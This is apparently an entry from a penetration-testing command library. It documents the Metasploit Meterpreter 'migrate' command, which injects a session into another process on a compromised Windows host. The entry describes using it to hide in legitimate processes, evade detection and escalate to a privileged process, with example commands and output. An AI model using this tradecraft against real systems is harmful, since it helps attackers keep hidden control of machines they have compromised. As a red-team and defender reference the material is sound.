---
id: 2d42f91b-5e09-431e-a943-fc21a21a0376
name: meterpreter-migrate-to-process
type: command
executor: metasploit
data: migrate $_PID
output: |-
  meterpreter > migrate 5852
  [*] Migrating from 7256 to 5852...
  [*] Migration completed successfully.
created_at: '2019-11-14T01:00:13.490166+00:00'
updated_at: '2023-05-29T16:48:52.884824+00:00'
platforms:
  - Windows
tags:
  - meterpreter
  - process-injection
verified: true
validated: true
---

# Meterpreter Migrate to a Process

## Command

```metasploit
migrate $_PID
```

## Description

This command migrates the current Meterpreter session into a specified process ID (PID) on the target, injecting the payload to maintain control while hiding in a legitimate process. It is commonly used for architecture upgrades or evasion by blending into system processes.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_PID | Target process ID (e.g., 5852 for a 64-bit svchost.exe) | Yes |

## Examples

### Basic Usage

```metasploit
migrate 5852
```

Migrates to PID 5852 after verifying it's 64-bit via `ps`.

### Advanced Usage

Migrate to a privileged process: First use `getpid` to note current PID, then `migrate <higher_priv_pid>` for escalation.

## Expected Output

```
meterpreter > migrate 5852
[*] Migrating from 7256 to 5852...
[*] Migration completed successfully.
```

The session continues in the new process; verify with `ps` or `getpid`.

## Related

- [[commands/meterpreter-list-running-processes]]
- [[procedures/upgrade-windows-meterpreter-x32-to-x64]]
